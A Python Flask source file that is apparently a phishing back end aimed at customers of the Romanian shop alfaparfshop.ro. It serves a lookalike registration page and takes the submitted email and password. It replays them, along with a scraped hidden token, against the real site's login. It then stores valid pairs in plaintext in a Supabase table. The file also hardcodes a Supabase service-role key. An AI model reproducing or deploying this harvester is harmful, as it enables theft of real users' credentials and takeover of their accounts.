from flask import Flask, render_template, redirect, request
from requests import Session
from re import findall
from supabase import create_client

login_url = 'https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect='
desired_url_after_login = 'https://www.alfaparfshop.ro/contul-meu'
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,ro-RO;q=0.6,ro;q=0.5",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.alfaparfshop.ro",
    "Referer": "https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect=",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
}
pattern = r'"name":"db369750155ef26e85b045b55c726a39","value":"(.*?)"'

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Necessary for session handling

supabase_client = create_client(
    "https://ssadrzbwbfkhtyyhwhqe.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNzYWRyemJ3YmZraHR5eWh3aHFlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcyMDU1MDU4MCwiZXhwIjoyMDM2MTI2NTgwfQ.i9Fr3Gfvif06FSCDgvME8IX4gN55Sq-KdvM93dsnz6M"
)

errorMsg = False

@app.route('/')
def index():
    return 'Index Page'

@app.route('/inregistrare')
def inregistrare():
    global errorMsg
    return render_template('inregistrare.html', errorMsg=errorMsg)

@app.route('/autentificare', methods=["POST"])
def autentificare():
    global errorMsg
    email = request.form['email']
    password = request.form['password']
    if not login(email, password):
        errorMsg = True
        return redirect("/inregistrare")
    errorMsg = False
    supabase_client.table('login').insert({'email': email, 'password': password}).execute()
    return redirect('/') 

def login(email, password):
    client = Session()
    response = client.get(login_url, headers=headers)
    matches = findall(pattern, response.text)
    if not len(matches) > 0:
        db369750155ef26e85b045b55c726a39=""
    else:
        db369750155ef26e85b045b55c726a39=matches[0]
    login_data = dict(email=email, password=password, db369750155ef26e85b045b55c726a39=db369750155ef26e85b045b55c726a39)
    response = client.post(login_url, data=login_data, headers=headers)
    if response.url == desired_url_after_login:
        return True
    return False

if __name__ == '__main__':
    app.run(debug=True)
